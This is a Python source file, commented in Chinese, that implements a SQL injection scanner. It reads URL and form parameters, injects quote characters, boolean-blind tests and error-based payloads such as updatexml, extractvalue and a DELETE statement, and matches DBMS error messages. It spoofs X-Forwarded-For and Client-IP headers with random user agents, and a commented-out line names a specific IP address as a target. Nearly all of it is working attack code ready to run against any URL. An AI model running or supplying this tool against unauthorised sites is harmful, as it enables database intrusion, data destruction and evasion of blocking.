import requests
import bs4
from bs4 import BeautifulSoup
import lxml
import re
import random
import itertools

BLOCKED_IP_REGEX = r"(?i)(\A|\b)IP\b.*\b(banned|blocked|bl(a|o)ck\s?list|firewall)" # regular expression used for recognition of generic firewall blocking 
TAMPER_SQL_CHAR_POOL = ('(', ')', '\'', '"')
DBMS_ERRORS = {                                                                     # regular expressions used for DBMS recognition based on error message response
    "MySQL": (r"SQL syntax.*MySQL", r"Warning.*mysql_.*", r"valid MySQL result", r"MySqlClient\."),
    "PostgreSQL": (r"PostgreSQL.*ERROR", r"Warning.*\Wpg_.*", r"valid PostgreSQL result", r"Npgsql\."),
    "Microsoft SQL Server": (r"Driver.* SQL[\-\_\ ]*Server", r"OLE DB.* SQL Server", r"(\W|\A)SQL Server.*Driver", r"Warning.*mssql_.*", r"(\W|\A)SQL Server.*[0-9a-fA-F]{8}", r"(?s)Exception.*\WSystem\.Data\.SqlClient\.", r"(?s)Exception.*\WRoadhouse\.Cms\."),
    "Microsoft Access": (r"Microsoft Access Driver", r"JET Database Engine", r"Access Database Engine"),
    "Oracle": (r"\bORA-[0-9][0-9][0-9][0-9]", r"Oracle error", r"Oracle.*Driver", r"Warning.*\Woci_.*", r"Warning.*\Wora_.*"),
    "IBM DB2": (r"CLI Driver.*DB2", r"DB2 SQL error", r"\bdb2_\w+\("),
    "SQLite": (r"SQLite/JDBCDriver", r"SQLite.Exception", r"System.Data.SQLite.SQLiteException", r"Warning.*sqlite_.*", r"Warning.*SQLite3::", r"\[SQLITE_ERROR\]"),
    "Sybase": (r"(?i)Warning.*sybase.*", r"Sybase message", r"Sybase.*Server message.*"),
}
PREFIXES, SUFFIXES = (" ", ") ", "' ", "') "), ("", "-- -", "#", "%%16")
BOOLEAN_TESTS = ("AND %d=%d", "OR NOT (%d>%d)")
RANDINT = random.randint(1, 255)
ERR_TESTS = (" AND GeometryCollection((select * from (select * from(select %s())a)b))", " AND polygon((select * from(select * from(select %s())a)b))",
             " AND multipoint((select * from(select * from(select %s())a)b))", " and (updatexml(0x3a,concat(1,(select %s())),1))",
             " and (extractvalue(1, concat(0x5c,(select %s()))))",
            " and (select 1 from  (select count(*),concat(version(),floor(rand(0)*2))x from  information_schema.tables group by x)a)",
            "updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)",
            "insert into info(name,age) values('wangwu'or updatexml(1,concat(0x7e,(version())),0) or'','22')",
            "delete from info where id=1 or updatexml(2,concat(0x7e,(version())),0);",
            )
def sql_scan(url, data=None):
    ERROR_BASED_INJECTION = 1
    BOOLEAN_BASED_INJECTION = 2
    flag = 0
    payload = ''
    value = []
    url_try_list = []
    method = 'both'
    action = ''
    print(url)
    i = 0
    for i in range(len(url)):
        if url[i] == '?':
            break
    #print(i)
    if i != len(url) - 1:
        url_path = url[0:i]
        para_list = re.findall(r'\?[0-9a-zA-Z\_]*\=[0-9a-zA-Z\_]*|\&[0-9a-zA-Z\_]*\=[0-9a-zA-Z\_\#]*', url)
#    print(para_list)
        for i in range(len(para_list)):
            para = para_list[i]
            value.append(para.split('=')[1])
            para = para.split('=')[0][1:]
            para_list[i] = para
    else:
        url_path = url
        para_list = []

    content, title = get_form(url)  #通过表单得知消息发送的信息
    if content != '':
        if re.findall(r'method=".*"|method = ".*"', str(content)):
            method = re.findall(r'method=".*"|method = ".*"', str(content))[0]
            method = re.findall(r'get|post', method)[0]
            method = method.lower()
        if re.findall(r'action=".*"|action = ".*"', str(content)):
            action = re.findall(r'action=".*"|action = ".*"', str(content))[0]
            action = re.findall(r'".*"', action)[0]
            action = re.findall(r'[0-9a-zA-Z\_\/]*', action)[0]
        for x in content.find_all('input'):
            if x.has_attr('name'):
                if not x['name'] in para_list and x['name'] != 'csrfmiddlewaretoken':
                    para_list.append(x['name'])
                    if x.has_attr('value'):
                        value.append(x['value'])
                    else:
                        value.append('')
        for x in content.find_all('select'):
            if x.has_attr('name'):
                if not x['name'] in para_list and x['name'] != 'csrfmiddlewaretoken':
                    para_list.append(x['name'])
                    if x.has_attr('value'):
                        value.append(x['value'])
                    else:
                        value.append('')         #得到表单信息，请求开始

    s = requests.session()                       #开始请求
    res_ori = s.get(url)
    soup_ori = BeautifulSoup(res_ori.text, 'lxml')
    if re.search(BLOCKED_IP_REGEX, str(soup_ori.find_all('html'))):
        print("[-] request blocked [-]\n")
        payload = "request BLOCKED"
        return flag, payload
    if method == 'get' or method == 'both':
        for i in range(len(para_list)):
            add = random.sample(TAMPER_SQL_CHAR_POOL, len(TAMPER_SQL_CHAR_POOL)) 
            val = value[i] + add[0] + add[1] + add[2] + add[3]
            for k in range(len(para_list)):
                if k == 0 and k == i:
                    url_try = url_path + '?' + para_list[k] + '=' + val
                elif k == 0 and k != i:
                    url_try = url_path + '?' + para_list[k] + '=' + value[k]
                elif k != 0 and k == i:
                    url_try = url_try + '&' + para_list[k] + '=' + val
                else: #k != 0 and k != 0
                    url_try = url_try + '&' + para_list[k] + '=' + value[k]
            url_try_list.append(url_try)      #得到一个在参数中添加了符号的url
    #    print(url_try_list)     

        for url_try in url_try_list:
    #        print("TRYING..." + url_try)
            res_try = s.get(url_try)
            res_try.encoding = res_try.apparent_encoding
            soup_try = BeautifulSoup(res_try.text, 'lxml')
    #        print(soup_try.prettify())
            for dbms in DBMS_ERRORS:
                for regex in DBMS_ERRORS[dbms]:
                    if re.search(regex, str(soup_try.find_all('html')), re.I) and not re.search(regex, str(soup_ori.find_all('html')), re.I):
                        flag = ERROR_BASED_INJECTION
                        payload = url_try
                        return flag, payload

    if method == 'post' or method == 'both':
        data = {}
        if action == '':
            post_path = url_path
        elif url_path.endswith('/') and action.startswith('/'):
            post_path = url_path + action[1:]
        elif not (url_path.endswith('/') and action.startswith('/')):
            post_path = url_path + '/' + action
        else:
            post_path = url_path + action   #构造表单发送的目标url

        for i in range(len(para_list)):
            add = random.sample(TAMPER_SQL_CHAR_POOL, len(TAMPER_SQL_CHAR_POOL)) 
            val = value[i] + add[0] + add[1] + add[2] + add[3]
            data[para_list[i]] = val
        res_try = s.post(post_path, data)
        soup_try = BeautifulSoup(res_try.text, 'lxml')
        for dbms in DBMS_ERRORS:
            for regex in DBMS_ERRORS[dbms]:
                if re.search(regex, str(soup_try.find_all('html')), re.I) and not re.search(regex, str(soup_ori.find_all('html')), re.I):
                    flag = ERROR_BASED_INJECTION
                    payload = "Method : post| PostData: " + str(data)
                    return flag, payload    #post方法的字符型注入
    if method == 'get' or method == 'both':
        url_try_list.clear()
        t = []
        f = []
        url_try_list2 = [t, f]

        for prefix, boolean, suffix, inline_comment in itertools.product(PREFIXES, BOOLEAN_TESTS, SUFFIXES, (False, True)):
            template = ("%s%s%s" % (prefix, boolean, suffix)).replace(" " if inline_comment else "/**/", "/**/")
            for bv in (True, False):  #表达式是真或假, bv -> bool value
                if bv:
                    template1 = re.sub(r'%d', str(RANDINT), template)   #恒等
                else:
                    template1 = re.sub(r'%d', str(RANDINT), template, count = 1)      #不等
                    template1 = re.sub(r'%d', str(RANDINT + 1), template1, count = 1)
                for i in range(len(para_list)):
                    for k in range(len(para_list)):
                        if k == 0 and k == i:
                            url_try = url_path + '?' + para_list[k] + '=' + value[k] + template1
                        elif k == 0 and k != i:
                            url_try = url_path + '?' + para_list[k] + '=' + value[k]
                        elif k != 0 and k == i:
                            url_try = url_try + '&' + para_list[k] + '=' + value[k] + template1
                        else: #k != 0 and k != 0
                            url_try = url_try + '&' + para_list[k] + '=' + value[k]
                    if bv:
                        url_try_list2[0].append(url_try)
                    else:
                        url_try_list2[1].append(url_try)

        for i in range(len(url_try_list2[0])):              #基于布尔表达式的布尔盲注
            true_res = s.get(url_try_list2[0][i])           #表达式为真的返回内容
            false_res = s.get(url_try_list2[1][i])          #表达式为假的返回内容
            true_soup = BeautifulSoup(true_res.text, 'lxml')
            false_soup = BeautifulSoup(false_res.text, 'lxml')
            if soup_ori.find('title') == true_soup.find('title') != false_soup.find('title'):
                flag = BOOLEAN_BASED_INJECTION
                payload = url_try_list2[0][i]
                return flag, payload
            if res_ori.status_code == true_res.status_code != false_res.status_code:
                flag = BOOLEAN_BASED_INJECTION
                payload = url_try_list2[0][i]
                return flag, payload                        #布尔盲注测试结束
    #    print(flag)
        url_try_list3 = []
        for template in ERR_TESTS:
            for i in range(len(para_list)):
                for k in range(len(para_list)):
                     if k == 0 and k == i:
                         url_try = url_path + '?' + para_list[k] + '=' + value[k] + re.sub(r'%s', para_list[k], template)
                     elif k == 0 and k != i:
                         url_try = url_path + '?' + para_list[k] + '=' + value[k]
                     elif k != 0 and k == i:
                         url_try = url_try + '&' + para_list[k] + '=' + value[k] + re.sub(r'%s', para_list[k], template)
                     else: #k != 0 and k != 0
                         url_try = url_try + '&' + para_list[k] + '=' + value[k]
                url_try_list3.append(url_try)

        for url_try in url_try_list3:        #基于SQL语句的报错注入
            res_try = s.get(url_try)
            soup_try = BeautifulSoup(res_try.text, 'lxml')
            if soup_ori.find('title') != soup_try.find('title') or res_ori.status_code != res_try.status_code:
                flag = ERROR_BASED_INJECTION
                payload = url_try
                return flag, payload
    return flag, payload

def get_form(url):
    url1 = url.strip()
    header = random_headers()
    res = requests.get(url1, timeout=10, verify=False, headers=header)
    res.encoding = res.apparent_encoding
    html = res.text
    all_soup = BeautifulSoup(html, "lxml")
    for forms in all_soup.find_all('form'):
        captchas = ['验证码', '验 证 码','点击更换', '点击刷新','看不清','认证码','安全问题']
        for captcha in captchas:
             if captcha in forms:
                 print("[-]" + captcha + " in page: " + url + '\n')
                 return '',''
    #总而言之，有验证码就结束爆破
    try:
        title = all_soup.title.text
    except:
        title = ''
    result = re.findall(".*<form (.*)</form>.*", html, re.S)
    #得到form标签往下所有的内容
    #如 <form id="...">
    #就从id=开始
    form_data = ''
    form_content = ''
    if result:
        form_data = '<form ' + result[0] + ' </form>' #整个表单部分的代码

        form_soup = BeautifulSoup(form_data, "lxml")

        form_content = form_soup.form #表单去除了标签

#        print(type(form_data), type(form_soup), type(form_content))
    return form_content, title

def random_headers():#生成随机headers
    user_agent = ['Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.8.1) Gecko/20061010 Firefox/2.0',
                  'Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.6 Safari/532.0',
                  'Mozilla/5.0 (Windows; U; Windows NT 5.1 ; x64; en-US; rv:1.9.1b2pre) Gecko/20081026 Firefox/3.1b2pre',
                  'Opera/10.60 (Windows NT 5.1; U; zh-cn) Presto/2.6.30 Version/10.60',
                  'Opera/8.01 (J2ME/MIDP; Opera Mini/2.0.4062; en; U; ssr)',
                  'Mozilla/5.0 (Windows; U; Windows NT 5.1; ; rv:1.9.0.14) Gecko/2009082707 Firefox/3.0.14',
                  'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36',
                  'Mozilla/5.0 (Windows; U; Windows NT 6.0; fr; rv:1.9.2.4) Gecko/20100523 Firefox/3.6.4 ( .NET CLR 3.5.30729)',
                  'Mozilla/5.0 (Windows; U; Windows NT 6.0; fr-FR) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16',
                  'Mozilla/5.0 (Windows; U; Windows NT 6.0; fr-FR) AppleWebKit/533.18.1 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5']
    UA = random.choice(user_agent)
    a = str(random.randint(1, 255))
    b = str(random.randint(1, 255))
    c = str(random.randint(1, 255))
    random_XFF = '127.' + a + '.' + b + '.' + c
    random_CI= '127.' + c + '.' + a + '.' + b
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'User-Agent': UA,
        'X-Forwarded-For': random_XFF,
        'Client-IP':random_CI,
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.8',
        "Referer": "http://www.baidu.com/",
        'Content-Type': 'application/x-www-form-urlencoded'}
    return headers

if __name__ == '__main__':
    url = input("URL:")
    print(sql_scan(url))
    #print(sql_scan("http://123.57.74.98:8000/login/"))